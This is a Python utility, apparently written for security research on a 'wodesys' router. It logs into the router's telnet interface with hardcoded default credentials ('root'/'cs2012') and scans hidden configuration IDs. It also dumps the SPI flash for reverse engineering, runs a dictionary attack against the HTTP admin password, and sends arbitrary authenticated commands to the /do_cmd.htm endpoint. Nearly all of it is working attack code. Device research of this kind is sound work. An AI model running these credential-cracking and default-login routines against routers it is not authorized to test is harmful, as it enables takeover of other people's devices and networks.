import base64
import socket
import telnetlib
import argparse
from cmds import command_dict
import time

class ID:
    def __init__(self, module_id, command_id, type, unknown):
        self.id_bytes = []
        self.id_bytes.append(module_id)
        self.id_bytes.append(command_id)
        self.id_bytes.append(type)
        self.id_bytes.append(unknown)

    def to_int(self):
        return int.from_bytes(self.id_bytes, 'big')

    def to_string(self):
        return hex(int.from_bytes(self.id_bytes, 'big')).split('0x')[1]

# Logs in to the telnet interface
def telnet_login(tn, user, password):
    tn.read_until(b"Login as:")
    tn.write(user.encode() + b"\n")

    tn.read_until(b"Password:")
    tn.write(password.encode() + b"\n")

    print("[+] Logged in\n")

# Send a command to the telnet interface on the router, get first line and flush
def send_telnet_command_and_get_line(tn, command):
    # Send the command
    tn.write(command + b'\n')

    # Read the line
    output = tn.read_until(b'\r\n').decode()

    # Flush remaining output
    tn.read_until(b'>')

    # Close the connection
    return output

# Send a command to the telnet interface on the router, get output until end, flush rest
def send_telnet_command_and_read_until(tn, command, end):
    # Send the command
    tn.write(command + b'\n')

    # Read the output until specified end string
    return tn.read_until(end.encode()).decode()

# Dumps memory in chunks to minimise risk of malloc error
def dump_flash(tn):
    go_to_submenu(tn, 'os')

    print("[+] Starting data read")

    chip_size = 2097152
    chunks = 8

    with open("mem_dump.txt", "w") as dump_file:
        for i in range(chunks):
            start = hex(int((chip_size/chunks) * i))
            size = str(chip_size/chunks)
            cmd_string = f"spi rd {start} {size}\n"

            tn.write(cmd_string.encode('ascii'))

            output = tn.read_until(b'OS>').decode()

            print(f"[*] Read {(i+1)*chip_size/chunks} bytes out of {chip_size}")

            dump_file.write(output.split('\r\n\r\n')[0])
            dump_file.write('\n')

        dump_file.close()

# Converts the incoming txt file to binary file that can be loaded into Ghidra
def convert_txt_to_bin(input_path):
    print(f"[*] Starting conversion of file {input_path}")
    # Open the hexdump file in read mode
    with open(input_path, 'r') as f:
        # Open the output binary file in write mode
        with open('mem_dump.bin', 'wb') as out:
            l = 1

            # Iterate over each line in the hexdump file
            for line in f:
                try:
                    # Split the line into a list of strings using the space character as the delimiter
                    line_data = line.split(' ')

                    # Iterate over each string in the list
                    for data in line_data:
                        byte_list = []
                        for i in range(4):
                            # Convert the string to a hex byte and append it to the list
                            single_byte = bytes.fromhex(data[2*i:2*i+2])

                            byte_list.append(single_byte)
                        
                        # Reverse byte list to correct endian
                        for element in byte_list[::-1]:
                            out.write(element)
                    l += 1
                except Exception:
                    print(f"[-] Conversion failed on line {l} of input file, check it looks valid:\n    {line}")
                    exit(0)

    print(f"[+] Conversion completed successfully, output to mem_dump.bin")

# Goes to the desired submenu in the telnet cmd line
def go_to_submenu(tn, name):
    # Go to top of menu tree
    send_telnet_command_and_get_line(tn, b'cd ..')
    submenu_cmd = f"cd {name}\nls"
    send_telnet_command_and_get_line(tn, submenu_cmd.encode('ascii'))

# Gets all the hidden values that don't appear in the config dump (as well as the ones that do)
def get_all_config(tn):
    go_to_submenu(tn, 'cfg')

    print_with_padding('Decimal ID', False, 12)
    print_with_padding('Hex ID', False, 12)
    print_with_padding('Name', False, 30)
    print("Value")

    # Scan id's for entries not in config
    for i in range(0, 255):
        for j in range(0, 255):
            for k in range(1, 5):
                id = ID(i, j, k, 0)
                response = send_telnet_command_and_get_line(tn, b"get " + id.to_string().encode())

                # Check that a value has been returned
                if (('UNKNOWN' not in response) and ('Not Found' not in response)) and '=' in response:
                    print_with_padding(str(id.to_int()), False, 12)
                    print_with_padding(id.to_string(), False, 12)
                    print_with_padding(response.split('=')[0], False, 30)
                    print(response.split('=')[1].rstrip())
                    #print(f"command_dict['{response.split('=')[0]}'] = {str(id.to_int())}") # For generating dictionary
                    break # Can break as only 1 type for each id

# Prints passed data with specified padding
def print_with_padding(to_print, line_break, space):
    if line_break:
        print(to_print + (space-len(to_print)) * ' ')
    else:
        print(to_print + (space-len(to_print)) * ' ', end='')

# Gets the decimal id of the config value with the passed name
def get_id_by_name(name):
    for cmd_name in command_dict.keys():
        if name in cmd_name:
            return command_dict[cmd_name]

# Send POST request using password as auth, and with the payload
def http_send(ip, password, payload):
    # Construct the authorization
    authorization = f"admin:{password.rstrip()}"
    encoded_authorization = base64.b64encode(authorization.encode("utf-8")).decode("utf-8")

    # Build the request
    request = "POST /do_cmd.htm HTTP/1.1\r\n"
    request += "Authorization: Basic {}\r\n".format(encoded_authorization)
    request += "Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Content-Length: {len(payload)}\r\n"
    request += "\r\n"
    request += payload

    # print(request)

    # Create socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 80))

    # Send the request
    s.sendall(request.encode("utf-8"))

    # receive data from the server
    data = s.recv(512) 

    s.close()

    return data

# Try and crack the http admin password with provided wordlist
def crack_password(wordlist):
    # get local machine name
    ip = "192.168.188.1"

    # Start time
    start = time.time()

    # Iterate over the wordlist
    count = 0
    bars = 100

    print(f"[*] Wordlist size: {len(wordlist)}\n")
    print(f"0% {' ' * (bars-8)} 100%")

    bar_width = len(wordlist)/bars
    
    for password in wordlist:
        count += 1

        if int(count % bar_width) == 0:
            print('#', end='', flush=True)

        data = http_send(ip, password, '')

        if b"401" not in data:
            return password.rstrip() + f"\t\t{count/(time.time() - start)} pwd/sec"    

# construct argparse
parser = argparse.ArgumentParser(
    prog='wodesys util',
    description='utils for wodesys router'
)

parser.add_argument('-ip', help='ip address', default='192.168.188.1', type=str)

subparsers = parser.add_subparsers(dest='command')

# construct telnet subparser
telnet_parser = subparsers.add_parser('telnet', help='telnet utils')
telnet_parser.add_argument('-s', '--scan', help='Scan for config values', action='store_true')
telnet_parser.add_argument('-d', '--dump', help='Dump the flash via OS spi command', action='store_true')
telnet_parser.add_argument('-u', '--username', help='Telnet username', default='root')
telnet_parser.add_argument('-p', '--password', help='Telnet password', default='cs2012')
telnet_parser.add_argument('-c', '--convert', help='Convert dumped text file to binary', metavar='file')
telnet_parser.add_argument('-m', '--msg', help='Message to send to telnet', metavar=('module', 'msg'), nargs=2)

# construct http subparser
http_parser = subparsers.add_parser('http', help='HTTP utils')
http_parser.add_argument('-d', '--dictionary', help='Dictionary attack for admin password using passed wordlist')
http_parser.add_argument('-s', '--set', help='Set config values via http request', nargs=3, metavar=('admin_pw', 'name', 'value'))
http_parser.add_argument('-f', '--find', help='Find config value name with substring search', type=str)
http_parser.add_argument('-p', '--payload', help='Payload to send as authenticated http request', type=str, nargs=2, metavar=('admin_pw', 'payload'))

args = parser.parse_args()

# Use telnet utils
if args.command == 'telnet':
    # Convert input text file to binary
    if args.convert is not None:
        convert_txt_to_bin(args.convert)
        exit(0)
    # Create telnet instance
    tn = telnetlib.Telnet(args.ip)

    # Login with hardcoded creds
    telnet_login(tn, args.username, args.password)

    # Scan for config values and print
    if args.scan:
        get_all_config(tn)

    # Dump the flash with os spi command
    if args.dump:
        dump_flash(tn)

    # Sends a telnet command to the router
    if args.msg:
        go_to_submenu(tn, args.msg[0])
        print(send_telnet_command_and_read_until(tn, args.msg[1].encode(), args.msg[0].upper() + '>'))

    # Close telnet connection when finished
    tn.close()
elif args.command == 'http':
    if args.set is not None:
        id = get_id_by_name(args.set[1])
        payload = f"CMD=SYS&SET0={id}%3D{args.set[2]}"

        print(f"[*] Setting config value {args.set[1]} with decimal id {id} to {args.set[2]}")
        print(f"[*] HTTP payload : {payload}")

        result = http_send(args.ip, args.set[0], payload)

        if b'200' in result:
            print("[+] Success")
        elif b'401' in result:
            print("\n[-] Failure, incorrect admin password")
    elif args.dictionary is not None:
        # Read in the wordlist from a file
        with open(args.dictionary, "r") as f:
            wordlist = f.readlines()

        # Call the password cracker function (136 passwords per second)
        password = crack_password(wordlist)

        # Print the password (if it was found)
        if password is not None:
            print(f"\n\n[+] Password found: {password}")
        else:
            print("\n\n[-] Password not found")
    elif args.find is not None:
        print(f"[*] Finding config entiries containing {args.find}\n")
        # Check names of all config names against query
        for name in command_dict.keys():
            # Get index of occurence (if there is one) to print green
            index = name.find(args.find)
            if index >= 0:
                print(name[:index], end='')
                print(f"\u001b[32m{args.find}\u001b[0m", end='')
                print(name[index+len(args.find):])
    elif args.payload is not None:
        print(f"[*] Sending HTTP payload : {args.payload[1]}")

        result = http_send(args.ip, args.payload[0], args.payload[1])

        print("\n[+] Response:\n" + result.decode(), end='')

        if b'200' in result:
            print("[+] Success")
        elif b'401' in result:
            print("[-] Failure, incorrect admin password")
